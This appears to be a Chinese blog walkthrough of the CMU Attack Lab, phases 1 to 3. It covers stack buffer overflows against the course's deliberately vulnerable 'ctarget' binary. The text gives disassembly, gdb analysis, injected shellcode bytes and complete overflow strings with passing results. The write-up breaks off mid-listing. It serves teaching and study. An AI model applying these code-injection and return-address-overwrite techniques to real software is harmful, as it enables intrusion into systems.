\tretq\n</code></pre>\n<p>而<code>touch1</code>函数的地址是<code>0x4017c0</code>。</p>\n<p>在这其中我们调用<code>getbuf</code>函数来进行 buffer overflow 攻击，原本的该函数的下一条返回地址是<code>0x401976</code>，我们需要将其换成<code>0x4017c0</code>。我们现在对<code>getbuf</code>进行反汇编(nop 指令省去)：</p>\n<pre><code>00000000004017a8 &lt;getbuf&gt;:\n  4017a8:\t48 83 ec 28          \tsub    $0x28,%rsp\n  4017ac:\t48 89 e7             \tmov    %rsp,%rdi\n  4017af:\te8 8c 02 00 00       \tcallq  401a40 &lt;Gets&gt;\n  4017b4:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  4017b9:\t48 83 c4 28          \tadd    $0x28,%rsp\n  4017bd:\tc3                   \tretq\n</code></pre>\n<p>对该过程进行分析：</p>\n<ol>\n<li>留出 40 个字节的位置</li>\n<li>rdi &#x3D; rsp</li>\n<li>调用 gets 函数</li>\n<li>eax &#x3D; 1</li>\n<li>恢复栈空间</li>\n<li>返回</li>\n</ol>\n<p>要完成这个实验，我们需要直到几个值：</p>\n<ol>\n<li>buf 的位置: 应该进入<code>getbuf</code>后，<code>%rsp - 40</code>之后的位置</li>\n<li>返回地址在栈中位置: 在调用<code>callq</code>函数时，我们会将<code>%rsp - 8</code>，然后将返回地址压入，然后将<code>%rip</code>设置为<code>getbuf</code>函数的地址。（同理，调用<code>retq</code>的时候，我们会把栈顶的地址赋给<code>%rip</code>，然后让<code>%rsp + 8</code>，也就是弹出返回地址）因此返回地址在栈中的位置也就是调用完<code>callq</code>之后<code>%rsp</code>的位置。</li>\n<li><code>touch1</code>函数的地址:<code>0x4017c0</code></li>\n</ol>\n<p>这样来看，buf 及其本地变量部分应该是分配了 40 个字节，而返回地址有 8 个字节，因此我们在写入的时候，前 40 个字节随意（不能有 0x0a,那个是换行符）。因为是小端法，最后 8 个字节应该是<code>0xc0 0x17 0x40</code>。</p>\n<p>该阶段输入内容存储在<code>phase1.txt</code>中，内容如下：<code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40</code>。输入命令<code>./hex2raw &lt; phase1.txt | ./ctarget -q</code>进行测试(<code>-q</code>是指运行在本地电脑上)，结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Touch1!: You called touch1()\nValid solution for level 1 with target ctarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40\n</code></pre>\n<p>成功！</p>\n<h3 id=\"Phase-2：在-buf-中插入攻击代码并覆盖返回地址\"><a href=\"#Phase-2：在-buf-中插入攻击代码并覆盖返回地址\" class=\"headerlink\" title=\"Phase 2：在 buf 中插入攻击代码并覆盖返回地址\"></a>Phase 2：在 buf 中插入攻击代码并覆盖返回地址</h3><p>在这个 phase 中我们需要在 buffer overflow 字符串中保留一部分攻击代码，让<code>test</code>函数返回到<code>touch2</code>，而且我们需要让<code>val</code>的值等于<code>cookie</code>的值。（而且这里我们不能直接让<code>test</code>返回到打印<code>Touch2!</code>那一句，因为前面有<code>vlevel = 2</code>，后面需要验证这个值是不是 2，如果直接跳到那一句的话，<code>vlevel</code>没有赋值，也肯定不等于 2，验证就会失败）。</p>\n<p><code>touch2</code>的函数源码如下：</p>\n<pre><code class=\"c\">void touch2(unsigned val)\n&#123;\n    vlevel = 2; /* Part of validation protocol */\n    if (val == cookie) &#123;\n        printf(&quot;Touch2!: You called touch2(0x%.8x)\\n&quot;, val);\n        validate(2);\n    &#125; else &#123;\n        printf(&quot;Misfire: You called touch2(0x%.8x)\\n&quot;, val);\n        fail(2);\n    &#125;\n    exit(0);\n&#125;\n</code></pre>\n<p><code>touch2</code>的汇编函数如下：</p>\n<pre><code>00000000004017ec &lt;touch2&gt;:\nseg1:\n  4017ec:\t48 83 ec 08          \tsub    $0x8,%rsp\n  4017f0:\t89 fa                \tmov    %edi,%edx\n  4017f2:\tc7 05 e0 2c 20 00 02 \tmovl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;\n  4017f9:\t00 00 00\n  4017fc:\t3b 3d e2 2c 20 00    \tcmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;\n  401802:\t75 20                \tjne    401824 &lt;touch2+0x38&gt;\n  401804:\tbe e8 30 40 00       \tmov    $0x4030e8,%esi\n  401809:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  40180e:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401813:\te8 d8 f5 ff ff       \tcallq  400df0 &lt;__printf_chk@plt&gt;\n  401818:\tbf 02 00 00 00       \tmov    $0x2,%edi\n  40181d:\te8 6b 04 00 00       \tcallq  401c8d &lt;validate&gt;\n  401822:\teb 1e                \tjmp    401842 &lt;touch2+0x56&gt;\nseg2:\n  401824:\tbe 10 31 40 00       \tmov    $0x403110,%esi\n  401829:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  40182e:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401833:\te8 b8 f5 ff ff       \tcallq  400df0 &lt;__printf_chk@plt&gt;\n  401838:\tbf 02 00 00 00       \tmov    $0x2,%edi\n  40183d:\te8 0d 05 00 00       \tcallq  401d4f &lt;fail&gt;\nseg3:\n  401842:\tbf 00 00 00 00       \tmov    $0x0,%edi\n  401847:\te8 f4 f5 ff ff       \tcallq  400e40 &lt;exit@plt&gt;\n</code></pre>\n<p>从上述汇编代码可以看出，<code>val</code>的值在最开始存在<code>edi</code>处。那么我们的目的就是让这个值等于<code>cookie</code>。而且<code>cookie</code>的位置是<code>6044e4</code>。所以我们的目的是让<code>%edi</code>寄存器的值等于<code>6044e4</code>处的值。</p>\n<p>要实现攻击，我们的 buffer overflow 必须完成四步动作：</p>\n<ol>\n<li>让 return address 等于 buf 的开头</li>\n<li>在 buf 开头插入赋值语句，让<code>%edi = *0x6044e4</code></li>\n<li>让 return address &#x3D; touch2 的入口地址(<code>0x4017ec</code>)</li>\n<li>调用<code>ret</code></li>\n</ol>\n<p>首先，要完成第一步，我们首先得找到 buf 的开头位置。通过 phase 1 的 getbuf 我们可以知道，buf 的位置在压完返回地址后减去 40 个字节的位置。因为前三问的栈的位置固定，因此我们可以通过 gdb 看一下减去 40 以后<code>%rsp</code>在哪里。<br>我们着重观察 3 个地方的<code>$rsp</code>：</p>\n<ol>\n<li>调用<code>getbuf</code>之前: 0x5561dca8</li>\n<li>调用<code>getbuf</code>之后: 0x5561dca0</li>\n<li>调用<code>rsp = rsp - 40</code>之后: 0x5561dc78</li>\n</ol>\n<p>那么我们可以判断 buf 的起始位置是<code>0x5561dc78</code>，返回地址的位置在其后 40 个字节处，也就是<code>0x5561dca0</code>。那么我们需要让 return address(buf 最后 8 个字节)的值等于<code>0x5561dc78</code>。换成小端序就是<code>0x78 0xdc 0x61 0x55</code>。</p>\n<p>第二条要生成的指令应该是:</p>\n<pre><code>movl $0x6044e4,%eax\nmovl (%eax),%edi\n</code></pre>\n<p>第三条要生成的指令应该是：</p>\n<pre><code>subq $0x8,%rsp\nmovl 0x4017ec,($rsp)\n</code></pre>\n<p>最后一条插入的指令是<code>ret</code>，在这个过程中，<code>%rsp</code>处的内容会被赋值给<code>%rip</code>，<code>%rsp</code>会自动加上 8。</p>\n<p>最后插入数条<code>nop</code>指令实现 PC 的顺序累加。</p>\n<p>由于这些指令在 Appendix A 表格中没有，所以我们需要手动生成。我们将如下内容保存在文件中：</p>\n<pre><code>    movl $0x6044e4,%eax\n    movl (%eax),%edi\n    subq $0x8,%rsp\n    movl $0x4017ec,(%rsp)\n    ret\n    nop\n    nop\n    nop\n    nop\n</code></pre>\n<p>然后使用<code>gcc -c ph2.s</code>生成<code>ph2.o</code>文件，然后使用<code>objdump -d ph2.o &gt; ph2.d</code>，打开<code>ph2.d</code>，有如下内容：</p>\n<pre><code>\nph2.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tb8 e4 44 60 00       \tmov    $0x6044e4,%eax\n   5:\t67 8b 38             \tmov    (%eax),%edi\n   8:\t48 83 ec 08          \tsub    $0x8,%rsp\n   c:\tc7 04 24 ec 17 40 00 \tmovl   $0x4017ec,(%rsp)\n  13:\tc3                   \tretq\n  14:\t90                   \tnop\n  15:\t90                   \tnop\n  16:\t90                   \tnop\n  17:\t90                   \tnop\n</code></pre>\n<p>那么我们所需要的字节就是<code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3</code>，共 20 字节。后续再插入 20 个字节的<code>nop</code>(0x90)</p>\n<p>完整的字符串是<code>b8 e4 44 60 00 67 8b 38 48 83 ec 08 c7 04 24 ec 17 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55</code>，我将其保存在<code>phase2.txt</code>中。</p>\n<blockquote>\n<p>注：一开始把<code>0x5561dc78</code>打成了<code>0x5564dc78</code>导致出现访问了未被初始化的位置，出现了 segmentation fault。在输入地址的时候要小心谨慎，不要出现太多问题。</p>\n<p>此外，注入代码的时候需要手动添加<code>ret</code>指令，否则程序不知道要返回，就算 buffer overflow 覆盖了返回地址也没用。</p>\n</blockquote>\n<p>结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Touch2!: You called touch2(0x59b997fa)\nValid solution for level 2 with target ctarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:ctarget:2:B8 E4 44 60 00 67 8B 38 48 83 EC 08 C7 04 24 EC 17 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55\n</code></pre>\n<p>成功！</p>\n<h3 id=\"Phase-3：在-buf-中插入所需字符串和攻击代码，并覆盖返回地址\"><a href=\"#Phase-3：在-buf-中插入所需字符串和攻击代码，并覆盖返回地址\" class=\"headerlink\" title=\"Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址\"></a>Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址</h3><p>在 phase 3 中，我们需要让程序在<code>getbuf</code>后，运行<code>touch3</code>函数，其注入方式和 phase 2 类似。（此处需要利用<code>vlevel = 3</code>进行跳转后验证，因此和上次一样，我们不能直接跳转到<code>Touch3!</code>语句，还是需要注入代码，将<code>%rdi</code>设置为<code>cookie</code>的值，然后再引导程序跳转到<code>touch3</code>的开头语句）。<code>touch3</code>函数的 C 语言版本如下：</p>\n<pre><code class=\"c\">/* Compare string to hex represention of unsigned value */\nint hexmatch(unsigned val, char *sval)\n&#123;\n    char cbuf[110];\n    /* Make position of check string unpredictable */\n    char *s = cbuf + random() % 100;\n    sprintf(s, &quot;%.8x&quot;, val);\n    return strncmp(sval, s, 9) == 0;\n&#125;\n\nvoid touch3(char *sval)\n&#123;\n    vlevel = 3; /* Part of validation protocol */\n    if (hexmatch(cookie, sval)) &#123;\n        printf(&quot;Touch3!: You called touch3(&quot;%s&quot;)\\n&quot;, sval);\n        validate(3);\n    &#125; else &#123;\n        printf(&quot;Misfire: You called touch3(&quot;%s&quot;)\\n&quot;, sval);\n        fail(3);\n    &#125;\n    exit(0);\n&#125;\n</code></pre>\n<h4 id=\"一开始的错误解答\"><a href=\"#一开始的错误解答\" class=\"headerlink\" title=\"一开始的错误解答\"></a>一开始的错误解答</h4><p>这里的差别在于我们输入的<code>string</code>是一个<code>cookie</code>的字符串表示。我们对<code>touch3</code>做反汇编看看<code>cookie</code>的字符串表示存在哪里？</p>\n<pre><code>   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;\n</code></pre>\n<p>我们输入<code>x/s 0x6044e4</code>看看结果：</p>\n<pre><code>(gdb) x/s 0x6044e4\n0x6044e4 &lt;cookie&gt;:      &quot;&quot;\n</code></pre>\n<p>这里同样，可以看出来和上一次的<code>cookie</code>放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值<code>%rdi</code>设置为<code>0x6044e4</code>位置的值。而这次<code>%rdi</code>指向输入的字符串，我们需要做的是将<code>%rdi</code>设置为<code>0x6044e4</code>。</p>\n<p>此外，<code>touch3</code>的入口地址为<code>0x4018fa</code>。因此在最后需要让 return address 等于这个值。</p>\n<p>那么总体的注入和上次遵循一样的步骤：</p>\n<ol>\n<li>让 return address 等于 buf 的开头(<code>0x5561dc78</code>)</li>\n<li>在 buf 开头插入赋值语句，让<code>%edi = 0x6044e4</code></li>\n<li>让 return address &#x3D; touch3 的入口地址(<code>0x4018fa</code>)</li>\n<li>调用<code>ret</code></li>\n</ol>\n<p>综上，这次的调用语句是：</p>\n<pre><code>    movl $0x6044e4,%edi\n    subq $0x8,%rsp\n    movl $0x4018fa,(%rsp)\n    ret\n    nop\n    nop\n    nop\n    nop\n</code></pre>\n<p>将其保存在<code>ph3.s</code>中，输入<code>gcc -c ph3.s</code>生成<code>ph3.o</code>文件，再<code>objdump -d ph3.o &gt; ph3.d</code>，生成<code>ph3.d</code>文件。</p>\n<p>文件内容如下：</p>\n<pre><code>\nph3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tbf e4 44 60 00       \tmov    $0x6044e4,%edi\n   5:\t48 83 ec 08          \tsub    $0x8,%rsp\n   9:\tc7 04 24 fa 18 40 00 \tmovl   $0x4018fa,(%rsp)\n  10:\tc3                   \tretq\n  11:\t90                   \tnop\n  12:\t90                   \tnop\n  13:\t90                   \tnop\n  14:\t90                   \tnop\n</code></pre>\n<p>那么其一直到<code>ret</code>的字节即为<code>bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code>。一共 17 个字节。将其字节复制到<code>phase3.txt</code>的最前面。添加 23 个<code>nop</code>(<code>0x90</code>)凑齐 40 个字节，最后 8 个字节的值必须等于<code>0x5561dc78</code>。换成小端序就是<code>0x78 0xdc 0x61 0x55</code>。</p>\n<p>完整字符串如下：</p>\n<pre><code>bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55\n</code></pre>\n<p>输入<code>./hex2raw &lt; phase3.txt | ./ctarget </code>。结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Misfire: You called touch3(&quot;���Y&quot;)\nFAIL: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:FAIL:0xffffffff:ctarget:3:BF E4 44 60 00 48 83 EC 08 C7 04 24 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55\n</code></pre>\n<p>最后确实跳转到了<code>touch3</code>，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽)</p>\n<h4 id=\"忽略随机栈空间的不正确解答\"><a href=\"#忽略随机栈空间的不正确解答\" class=\"headerlink\" title=\"忽略随机栈空间的不正确解答\"></a>忽略随机栈空间的不正确解答</h4><p>我们最早是认为，应该让<code>%edi</code>指向<code>0x6044e4</code>，也就是<code>cookie</code>字符串所在的位置，来让<code>%edi</code>和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现，<code>cookie</code>不是个字符串，还是个<code>unsigned</code>类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让<code>输入的字符串</code>和<code>打印出来的 cookie 的值</code>相同。所以这里不能让<code>%rdi</code>指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给<code>%rdi</code>，然后让<code>%rdi</code>和<code>cookie</code>的打印版进行比较。</p>\n<p>那么<code>cookie</code>的值是多少？我们使用<code>p /x cookie</code>命令打印一下：</p>\n<pre><code>(gdb) p /x cookie\n$4 = 0x59b997fa\n</code></pre>\n<p>所以输入的字符串应该是<code>0x59b997fa</code>。</p>\n<p>经过阅读 attacklab.pdf，作者给出了以下几个提示：</p>\n<ol>\n<li>攻击字符串中应该包含一个 cookie 的字符串表示。该字符串应该包含 8 个 16 进制字符（不带 0x）</li>\n<li>字符串最后应该有个 0，输入<code>man ascii</code>在 Linux 中查找 ascii 表</li>\n<li>攻击代码应该让<code>%rdi</code>的值等于这个字符串的起始地址</li>\n<li><code>hexmatch</code>和<code>strncmp</code>可能会覆盖一部分<code>getbuf</code>中的 buf，注意不要让你的攻击字符串被覆盖掉。</li>\n</ol>\n<p>那么初始的准备工作应该是：</p>\n<ol>\n<li>确定插入字符串和攻击代码的有效区域，防止被<code>hexmatch</code>和<code>strncmp</code>影响到</li>\n<li>查找<code>cookie</code>字符串的编码，加上一个<code>\\0</code>，并插入到攻击代码之前</li>\n<li>确定攻击代码的起始位置（在插入的字符串后），将其地址插入到 buffer overflow 的最后 8 个字节</li>\n</ol>\n<p>在攻击代码中所做的工作应该是：</p>\n<ol>\n<li>让<code>%rdi = 插入字符串的起始位置</code></li>\n<li>将<code>touch3</code>的起始位置插入到返回地址处</li>\n<li>调用<code>ret</code>返回</li>\n<li>通过多个<code>nop</code>填充字符串（也可以不填充？）</li>\n</ol>\n<p>我们首先确定<code>getbuf</code>的<code>buf</code>范围，<code>hexmatch</code>的辐射范围和<code>strncmp</code>的辐射范围。</p>\n<p>通过<a href=\"#phase-2%E5%9C%A8-buf-%E4%B8%AD%E6%8F%92%E5%85%A5%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%B9%B6%E8%A6%86%E7%9B%96%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80\">前文</a>我们分析过：</p>\n<ol>\n<li>调用<code>getbuf</code>之前: <code>0x5561dca8</code></li>\n<li>调用<code>getbuf</code>之后: <code>0x5561dca0</code></li>\n<li>调用<code>rsp = rsp - 40</code>之后: <code>0x5561dc78</code></li>\n</ol>\n<p>可以了解到<code>buf</code>的范围是：<code>0x5561dc78 ~ 0x5561dc9f</code>，<code>buf</code>后 8 个字节的返回地址的位置是<code>0x5561dca0</code>。</p>\n<p>对<code>touch3</code>进行反汇编可得：</p>\n<pre><code>Dump of assembler code for function touch3:\n   0x00000000004018fa &lt;+0&gt;:     push   %rbx\n   0x00000000004018fb &lt;+1&gt;:     mov    %rdi,%rbx\n   0x00000000004018fe &lt;+4&gt;:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc &lt;vlevel&gt;\n   0x0000000000401908 &lt;+14&gt;:    mov    %rdi,%rsi\n   0x000000000040190b &lt;+17&gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &lt;cookie&gt;\n   0x0000000000401911 &lt;+23&gt;:    callq  0x40184c &lt;hexmatch&gt;\n   0x0000000000401916 &lt;+28&gt;:    test   %eax,%eax\n   0x0000000000401918 &lt;+30&gt;:    je     0x40193d &lt;touch3+67&gt;\n   0x000000000040191a &lt;+32&gt;:    mov    %rbx,%rdx\n   0x000000000040191d &lt;+35&gt;:    mov    $0x403138,%esi\n   0x0000000000401922 &lt;+40&gt;:    mov    $0x1,%edi\n   0x0000000000401927 &lt;+45&gt;:    mov    $0x0,%eax\n   0x000000000040192c &lt;+50&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;\n   0x0000000000401931 &lt;+55&gt;:    mov    $0x3,%edi\n   0x0000000000401936 &lt;+60&gt;:    callq  0x401c8d &lt;validate&gt;\n   0x000000000040193b &lt;+65&gt;:    jmp    0x40195e &lt;touch3+100&gt;\n   0x000000000040193d &lt;+67&gt;:    mov    %rbx,%rdx\n   0x0000000000401940 &lt;+70&gt;:    mov    $0x403160,%esi\n   0x0000000000401945 &lt;+75&gt;:    mov    $0x1,%edi\n   0x000000000040194a &lt;+80&gt;:    mov    $0x0,%eax\n   0x000000000040194f &lt;+85&gt;:    callq  0x400df0 &lt;__printf_chk@plt&gt;\n   0x0000000000401954 &lt;+90&gt;:    mov    $0x3,%edi\n   0x0000000000401959 &lt;+95&gt;:    callq  0x401d4f &lt;fail&gt;\n   0x000000000040195e &lt;+100&gt;:   mov    $0x0,%edi\n   0x0000000000401963 &lt;+105&gt;:   callq  0x400e40 &lt;exit@plt&gt;\nEnd of assembler dump.\n</code></pre>\n<p>对<code>hexmatch</code>进行反汇编可得：</p>\n<pre><code>Dump of assembler code for function hexmatch:\n   0x000000000040184c &lt;+0&gt;:     push   %r12\n   0x000000000040184e &lt;+2&gt;:     push   %rbp\n   0x000000000040184f &lt;+3&gt;:     push   %rbx\n   0x0000000000401850 &lt;+4&gt;:     add    $0xffffffffffffff80,%rsp\n   0x0000000000401854 &lt;+8&gt;:     mov    %edi,%r12d\n   0x0000000000401857 &lt;+11&gt;:    mov    %rsi,%rbp\n   0x000000000040185a &lt;+14&gt;:    mov    %fs:0x28,%rax\n   0x0000000000401863 &lt;+23&gt;:    mov    %rax,0x78(%rsp)\n   0x0000000000401868 &lt;+28&gt;:    xor    %eax,%eax\n   0x000000000040186a &lt;+30&gt;:    callq  0x400db0 &lt;random@plt&gt;\n   0x000000000040186f &lt;+35&gt;:    mov    %rax,%rcx\n   0x0000000000401872 &lt;+38&gt;:    movabs $0xa3d70a3d70a3d70b,%rdx\n   0x000000000040187c &lt;+48&gt;:    imul   %rdx\n   0x000000000040187f &lt;+51&gt;:    add    %rcx,%rdx\n   0x0000000000401882 &lt;+54&gt;:    sar    $0x6,%rdx\n   0x0000000000401886 &lt;+58&gt;:    mov    %rcx,%rax\n   0x0000000000401889 &lt;+61&gt;:    sar    $0x3f,%rax\n   0x000000000040188d &lt;+65&gt;:    sub    %rax,%rdx\n   0x0000000000401890 &lt;+68&gt;:    lea    (%rdx,%rdx,4),%rax\n   0x0000000000401894 &lt;+72&gt;:    lea    (%rax,%rax,4),%rax\n   0x0000000000401898 &lt;+76&gt;:    shl    $0x2,%rax\n   0x000000000040189c &lt;+80&gt;:    sub    %rax,%rcx\n   0x000000000040189f &lt;+83&gt;:    lea    (%rsp,%rcx,1),%rbx\n   0x00000000004018a3 &lt;+87&gt;:    mov    %r12d,%r8d\n   0x00000000004018a6 &lt;+90&gt;:    mov    $0x4030e2,%ecx\n   0x00000000004018ab &lt;+95&gt;:    mov    $0xffffffffffffffff,%rdx\n   0x00000000004018b2 &lt;+102&gt;:   mov    $0x1,%esi\n   0x00000000004018b7 &lt;+107&gt;:   mov    %rbx,%rdi\n   0x00000000004018ba &lt;+110&gt;:   mov    $0x0,%eax\n   0x00000000004018bf &lt;+115&gt;:   callq  0x400e70 &lt;__sprintf_chk@plt&gt;\n   0x00000000004018c4 &lt;+120&gt;:   mov    $0x9,%edx\n   0x00000000004018c9 &lt;+125&gt;:   mov    %rbx,%rsi\n   0x00000000004018cc &lt;+128&gt;:   mov    %rbp,%rdi\n   0x00000000004018cf &lt;+131&gt;:   callq  0x400ca0 &lt;strncmp@plt&gt;\n   0x00000000004018d4 &lt;+136&gt;:   test   %eax,%eax\n   0x00000000004018d6 &lt;+138&gt;:   sete   %al\n   0x00000000004018d9 &lt;+141&gt;:   movzbl %al,%eax\n   0x00000000004018dc &lt;+144&gt;:   mov    0x78(%rsp),%rsi\n   0x00000000004018e1 &lt;+149&gt;:   xor    %fs:0x28,%rsi\n   0x00000000004018ea &lt;+158&gt;:   je     0x4018f1 &lt;hexmatch+165&gt;\n   0x00000000004018ec &lt;+160&gt;:   callq  0x400ce0 &lt;__stack_chk_fail@plt&gt;\n   0x00000000004018f1 &lt;+165&gt;:   sub    $0xffffffffffffff80,%rsp\n   0x00000000004018f5 &lt;+169&gt;:   pop    %rbx\n   0x00000000004018f6 &lt;+170&gt;:   pop    %rbp\n   0x00000000004018f7 &lt;+171&gt;:   pop    %r12\n   0x00000000004018f9 &lt;+173&gt;:   retq\nEnd of assembler dump.\n</code></pre>\n<p>对<code>strncmp</code>进行反汇编可得：</p>\n<pre><code>Dump of assembler code for function strncmp_ifunc:\n   0x00007ffff7e54710 &lt;+0&gt;:     endbr64\n   0x00007ffff7e54714 &lt;+4&gt;:     mov    0x14c745(%rip),%rcx        # 0x7ffff7fa0e60\n   0x00007ffff7e5471b &lt;+11&gt;:    lea    0xe4b0e(%rip),%rax        # 0x7ffff7f39230 &lt;__strncmp_avx2&gt;\n   0x00007ffff7e54722 &lt;+18&gt;:    movabs $0x90000000002,%rdx\n   0x00007ffff7e5472c &lt;+28&gt;:    movabs $0x10000000002,%rsi\n   0x00007ffff7e54736 &lt;+38&gt;:    and    0xc8(%rcx),%rdx\n   0x00007ffff7e5473d &lt;+45&gt;:    cmp    %rsi,%rdx\n   0x00007ffff7e54740 &lt;+48&gt;:    je     0x7ffff7e54772 &lt;strncmp_ifunc+98&gt;\n   0x00007ffff7e54742 &lt;+50&gt;:    mov    0x70(%rcx),%edx\n   0x00007ffff7e54745 &lt;+53&gt;:    test   $0x100000,%edx\n   0x00007ffff7e5474b &lt;+59&gt;:    je     0x7ffff7e5475d &lt;strncmp_ifunc+77&gt;\n   0x00007ffff7e5474d &lt;+61&gt;:    lea    0xdf78c(%rip),%rax        # 0x7ffff7f33ee0 &lt;__strncmp_sse42&gt;\n   0x00007ffff7e54754 &lt;+68&gt;:    testb  $0x80,0xcc(%rcx)\n   0x00007ffff7e5475b &lt;+75&gt;:    je     0x7ffff7e54772 &lt;strncmp_ifunc+98&gt;\n   0x00007ffff7e5475d &lt;+77&gt;:    and    $0x2,%dh\n   0x00007ffff7e54760 &lt;+80&gt;:    lea    0xaef9(%rip),%rax        # 0x7ffff7e5f660 &lt;__strncmp_sse2&gt;\n   0x00007ffff7e54767 &lt;+87&gt;:    lea    0xc51a2(%rip),%rdx        # 0x7ffff7f19910 &lt;__strncmp_ssse3&gt;\n   0x00007ffff7e5476e &lt;+94&gt;:    cmovne %rdx,%rax\n   0x00007ffff7e54772 &lt;+98&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>其中与栈相关的指令包括：</p>\n<pre><code>hex2match前(touch3中)：\n    push   %rbx\n    callq hex2match\nhex2match:\n   0x000000000040184c &lt;+0&gt;:     push   %r12\n   0x000000000040184e &lt;+2&gt;:     push   %rbp\n   0x000000000040184f &lt;+3&gt;:     push   %rbx\n\n   0x00000000004018f5 &lt;+169&gt;:   pop    %rbx\n   0x00000000004018f6 &lt;+170&gt;:   pop    %rbp\n   0x00000000004018f7 &lt;+171&gt;:   pop    %r12\n                                retq\nhex2match后：\n    callq strncmp\nstrncmp:\n    retq\n</code></pre>\n<p>由于<code>hexmatch</code>和<code>strncmp</code>是在<code>touch3</code>里面调用的，而<code>touch3</code>是在执行攻击代码之后调用，在攻击代码中我们将<code>%rdi</code>指向字符串的地址，因此我们需要保证的是<code>touch3</code>中的<code>push</code>和<code>pop</code>指令不影响之前的字符串，以免影响<code>%rdi</code>指向的值。</p>\n<p>在调用<code>touch3</code>之前，我们刚刚执行了<code>ret</code>指令，其作用是将返回地址赋值给<code>%rip</code>并弹出，操作完成后<code>%rsp</code>应该在<code>buf + 48</code>位置处。我们是通过直接返回到<code>touch3</code>的开头位置来执行<code>touch3</code>的，而不是<code>callq touch3</code>，因此无需往栈中压入下一条指令的地址（当然这里也没有下一条啦~）</p>\n<p>通过上述过程分析我们可以看到，栈的最低位置应该是在经过了一下几个步骤之后：</p>\n<ol>\n<li><code>push %rbx</code>，这里压入了 rbx，栈位置来到了<code>buf + 40</code></li>\n<li><code>callq hex2match</code>，这里压入了<code>callq</code>的下一条指令的地址，栈位置来到了<code>buf + 32</code></li>\n<li><code>push r12</code>，压入了<code>r12</code>，栈位置来到了<code>buf + 24</code></li>\n<li><code>push rbp</code>，压入了<code>rbp</code>，栈位置来到了<code>buf + 16</code></li>\n<li><code>push rbx</code>，压入了<code>rbx</code>，栈位置来到了<code>buf + 8</code></li>\n</ol>\n<p>后续主要执行的都是<code>pop</code>和<code>retq</code>操作，虽然有一个<code>callq strncmp</code>，但是栈的位置不可能低于<code>buf + 8</code>。因此我们插入的字符串必须在<code>buf + 8</code>之前。我们输入的字符串刚好是 8 个字符，1 个字符一个字节，也刚好是 8 个字节，那么就应当插在<code>buf</code>处。从<code>buf + 8</code>处开始插入攻击代码。</p>\n<p>此外：</p>\n<ol>\n<li><code>59b997fa</code>的字符串编码应该是：<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61</code>（插在攻击代码前）</li>\n<li><code>buf + 8</code>处的地址是：<code>0x5561dc80</code>（插入返回地址部分），转化成小端法应该是<code>80 dc 61 55</code></li>\n<li><code>touch3</code>的地址是<code>0x4018fa</code></li>\n</ol>\n<p>那么我们的攻击指令应该是：</p>\n<pre><code>movl $0x5561dc78,%edi\nsubq $0x8,%rsp\nmovl $0x4018fa,(%rsp)\nret\n</code></pre>\n<p>将其放入<code>ph3.s</code>中，输入<code>gcc -c ph3.s</code>得到<code>ph3.o</code>，输入<code>objdump -d ph3.o &gt; ph3.d</code>，得到<code>ph3.d</code>文件如下：</p>\n<pre><code>\nph3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tbf 78 dc 61 55       \tmov    $0x5561dc78,%edi\n   5:\t48 83 ec 08          \tsub    $0x8,%rsp\n   9:\tc7 04 24 fa 18 40 00 \tmovl   $0x4018fa,(%rsp)\n  10:\tc3                   \tretq\n  11:\t90                   \tnop\n  12:\t90                   \tnop\n  13:\t90                   \tnop\n  14:\t90                   